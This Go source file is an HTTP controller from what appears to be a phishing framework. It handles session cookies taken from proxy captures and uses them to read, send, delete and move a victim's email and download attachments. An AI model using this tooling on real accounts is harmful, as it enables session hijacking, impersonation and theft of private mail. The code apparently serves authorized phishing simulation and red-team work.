package controller

import (
	"errors"
	"fmt"
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"github.com/phishingclub/phishingclub/service"
)

// CookieStoreController handles cookie store CRUD, sending, and inbox reading
type CookieStoreController struct {
	Common
	Service *service.CookieStoreService
	Rotator *service.CookieRotator
}

// GetAll returns all cookie stores with pagination
func (c *CookieStoreController) GetAll(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	queryArgs, ok := c.handleQueryArgs(g)
	if !ok {
		return
	}
	queryArgs.DefaultSortByUpdatedAt()

	result, err := c.Service.GetAll(g, session, &repository.CookieStoreOption{
		QueryArgs: queryArgs,
	})
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, result)
}

// GetByID returns a cookie store by ID
func (c *CookieStoreController) GetByID(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	store, err := c.Service.GetByID(g, session, id)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, store)
}

// Import imports cookies from a manual import request
func (c *CookieStoreController) Import(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req model.CookieStoreImportRequest
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}

	if req.Name == "" {
		c.Response.BadRequestMessage(g, "name is required")
		return
	}
	if len(req.Cookies) == 0 {
		c.Response.BadRequestMessage(g, "cookies array is required")
		return
	}

	id, err := c.Service.Import(g, session, &req)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{"id": id, "message": "cookies imported, validating session..."})
}

// ImportFromCapture imports cookies from a proxy capture record
func (c *CookieStoreController) ImportFromCapture(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req struct {
		CaptureID  string `json:"captureId"`
		Name       string `json:"name"`
		CookieJSON string `json:"cookieJSON"`
	}
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}

	captureID, err := uuid.Parse(req.CaptureID)
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid capture ID")
		return
	}

	if req.Name == "" {
		req.Name = "Proxy Capture Import"
	}

	id, err := c.Service.ImportFromProxyCapture(g, session, captureID, req.Name, req.CookieJSON)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{"id": id, "message": "cookies imported from capture, validating session..."})
}

// Revalidate re-checks if a cookie session is still valid
func (c *CookieStoreController) Revalidate(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	store, err := c.Service.Revalidate(g, session, id)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, store)
}

// Delete deletes a cookie store by ID
func (c *CookieStoreController) Delete(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	err = c.Service.Delete(g, session, id)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{"message": "deleted"})
}

// DeleteAll deletes all cookie stores
func (c *CookieStoreController) DeleteAll(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	err := c.Service.DeleteAll(g, session)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{"message": "all cookie stores deleted"})
}

// Send sends an email using captured cookies
func (c *CookieStoreController) Send(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req model.CookieSendRequest
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}

	if req.CookieStoreID == "" {
		c.Response.BadRequestMessage(g, "cookieStoreId is required")
		return
	}
	if len(req.To) == 0 {
		c.Response.BadRequestMessage(g, "at least one recipient is required")
		return
	}
	if req.Subject == "" {
		c.Response.BadRequestMessage(g, "subject is required")
		return
	}

	result, err := c.Service.SendEmail(g, session, &req)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, result)
}

// GetInbox reads the inbox of a cookie session
func (c *CookieStoreController) GetInbox(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	folder := g.DefaultQuery("folder", "inbox")
	limit := 25
	skip := 0

	if l := g.Query("limit"); l != "" {
		if v, err := strconv.Atoi(l); err == nil {
			limit = v
		}
	}
	if s := g.Query("skip"); s != "" {
		if v, err := strconv.Atoi(s); err == nil {
			skip = v
		}
	}

	messages, total, err := c.Service.GetInbox(g, session, id, folder, limit, skip)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{
		"messages":   messages,
		"total":      total,
		"totalCount": total,
		"folder":     folder,
	})
}

// GetMessage reads a specific email message
func (c *CookieStoreController) GetMessage(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	messageID := g.Param("messageId")
	if messageID == "" {
		c.Response.BadRequestMessage(g, "messageId is required")
		return
	}

	msg, err := c.Service.GetMessage(g, session, id, messageID)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, msg)
}

// GetFolders lists mail folders for a cookie session
func (c *CookieStoreController) GetFolders(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}

	folders, err := c.Service.GetFolders(g, session, id)
	if !c.handleErrors(g, err) {
		return
	}

	c.Response.OK(g, gin.H{"folders": folders})
}

// --- Phase 2: Message-action handlers ---

// parseStoreAndMessageIDs reads :id (UUID) and :messageId from the URL.
func (c *CookieStoreController) parseStoreAndMessageIDs(g *gin.Context) (uuid.UUID, string, bool) {
	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return uuid.Nil, "", false
	}
	messageID := g.Param("messageId")
	if messageID == "" {
		c.Response.BadRequestMessage(g, "messageId is required")
		return uuid.Nil, "", false
	}
	return id, messageID, true
}

// handleActionError maps service errors to responses. Returns true when an
// error was handled (and the request should return immediately).
func (c *CookieStoreController) handleActionError(g *gin.Context, err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, service.ErrGraphUnavailable) {
		c.Response.BadRequestMessage(g, "action not supported for this session")
		return true
	}
	return !c.handleErrors(g, err)
}

// MarkMessageRead sets the read state of a message.
func (c *CookieStoreController) MarkMessageRead(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	var body struct {
		IsRead bool `json:"isRead"`
	}
	if err := g.ShouldBindJSON(&body); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}
	if err := c.Service.MarkMessageRead(g, session, id, messageID, body.IsRead); err != nil {
		if c.handleActionError(g, err) {
			return
		}
	}
	c.Response.OK(g, gin.H{"success": true, "isRead": body.IsRead})
}

// FlagMessage sets the flagged state of a message.
func (c *CookieStoreController) FlagMessage(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	var body struct {
		Flagged bool `json:"flagged"`
	}
	if err := g.ShouldBindJSON(&body); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}
	if err := c.Service.FlagMessage(g, session, id, messageID, body.Flagged); err != nil {
		if c.handleActionError(g, err) {
			return
		}
	}
	c.Response.OK(g, gin.H{"success": true, "flagged": body.Flagged})
}

// DeleteMessage deletes a single message (moves it to Deleted Items).
func (c *CookieStoreController) DeleteMessage(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	if err := c.Service.DeleteMessage(g, session, id, messageID); err != nil {
		if c.handleActionError(g, err) {
			return
		}
	}
	c.Response.OK(g, gin.H{"success": true})
}

// MoveMessage moves a single message to the given folder.
func (c *CookieStoreController) MoveMessage(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	var body struct {
		DestinationFolderID string `json:"destinationFolderId"`
	}
	if err := g.ShouldBindJSON(&body); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}
	if body.DestinationFolderID == "" {
		c.Response.BadRequestMessage(g, "destinationFolderId is required")
		return
	}
	newID, err := c.Service.MoveMessage(g, session, id, messageID, body.DestinationFolderID)
	if err != nil {
		if c.handleActionError(g, err) {
			return
		}
	}
	c.Response.OK(g, gin.H{"success": true, "newMessageId": newID})
}

// BulkMessageAction applies an action across multiple messages.
func (c *CookieStoreController) BulkMessageAction(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, err := uuid.Parse(g.Param("id"))
	if err != nil {
		c.Response.BadRequestMessage(g, "invalid ID")
		return
	}
	var req service.BulkMessageActionRequest
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}
	if req.Action == "" {
		c.Response.BadRequestMessage(g, "action is required")
		return
	}
	if len(req.MessageIDs) == 0 {
		c.Response.BadRequestMessage(g, "messageIds must be non-empty")
		return
	}
	result, err := c.Service.BulkMessageAction(g, session, id, &req)
	if !c.handleErrors(g, err) {
		return
	}
	c.Response.OK(g, result)
}

// DownloadAttachment streams an attachment back to the client as a file download.
func (c *CookieStoreController) DownloadAttachment(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	attachmentID := g.Param("attachmentId")
	if attachmentID == "" {
		c.Response.BadRequestMessage(g, "attachmentId is required")
		return
	}

	// We can't use c.Response.OK here because we're streaming binary.
	// Write directly to g.Writer after the service sets the headers.
	// Use a buffering approach: service returns filename + content type, then
	// writes body bytes into the ResponseWriter.
	var rec _attachmentRecorder
	filename, contentType, err := c.Service.DownloadAttachment(g, session, id, messageID, attachmentID, &rec)
	if err != nil {
		if errors.Is(err, service.ErrGraphUnavailable) {
			c.Response.BadRequestMessage(g, "action not supported for this session")
			return
		}
		c.Response.BadRequestMessage(g, fmt.Sprintf("attachment download failed: %s", err.Error()))
		return
	}

	if contentType == "" {
		contentType = "application/octet-stream"
	}
	g.Header("Content-Type", contentType)
	g.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	g.Header("X-Content-Type-Options", "nosniff")
	g.Status(http.StatusOK)
	_, _ = g.Writer.Write(rec.buf)
}

// _attachmentRecorder is a minimal io.Writer that collects bytes for us.
// We buffer so we can set Content-Disposition/Content-Type reliably after
// the service has read the metadata. Attachments are capped by Graph API
// size limits and this matches the pattern used in existing export code.
type _attachmentRecorder struct {
	buf []byte
}

// Write appends bytes to the internal buffer.
func (r *_attachmentRecorder) Write(p []byte) (int, error) {
	r.buf = append(r.buf, p...)
	return len(p), nil
}

// GetMessageAttachments returns attachment metadata for a message.
func (c *CookieStoreController) GetMessageAttachments(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}
	id, messageID, ok := c.parseStoreAndMessageIDs(g)
	if !ok {
		return
	}
	atts, err := c.Service.GetMessageAttachments(g, session, id, messageID)
	if err != nil {
		if errors.Is(err, service.ErrGraphUnavailable) {
			c.Response.BadRequestMessage(g, "action not supported for this session")
			return
		}
		if !c.handleErrors(g, err) {
			return
		}
	}
	c.Response.OK(g, gin.H{"attachments": atts})
}
